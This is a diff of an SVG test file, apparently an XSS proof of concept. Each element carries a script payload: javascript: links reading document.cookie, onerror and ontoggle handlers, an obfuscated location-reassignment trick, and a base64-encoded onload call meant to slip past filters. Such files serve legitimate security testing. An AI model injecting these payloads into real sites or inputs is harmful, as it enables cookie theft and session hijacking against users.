@@ -1,13 +1,23 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <foreignObject width="100" height="100">
     <body xmlns="http://www.w3.org/1999/xhtml">
-      <details x="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2" open ontoggle="prompt(document.cookie);">
-        %20<img src="o" onerror="alert('')">//</details>
-      <a href="javascript:window/*Ata*/['loc'+'ati'+'on']='java'+'scr'+'ipt:'+location/*#*/;alert(origin)">
-        Click me
-      </a>
-      <svg Only="1" OnLoad="confirm(atob('Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=='))">
-      </svg>
+      <div>
+        <p>
+          <a href="javascript:alert(document.cookie)">Click me</a>
+        </p>
+        <p>
+          <img src="#" onerror="alert('Image error')">
+        </p>
+        <p>
+          <a href="javascript:window/*Ata*/['loc'+'ati'+'on']='java'+'scr'+'ipt:'+location/*#*/;alert(origin)">
+            Click me too
+          </a>
+        </p>
+        <p>
+          <svg Only="1" onload="confirm(atob('Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=='))">
+          </svg>
+        </p>
+      </div>
     </body>
   </foreignObject>
 </svg>
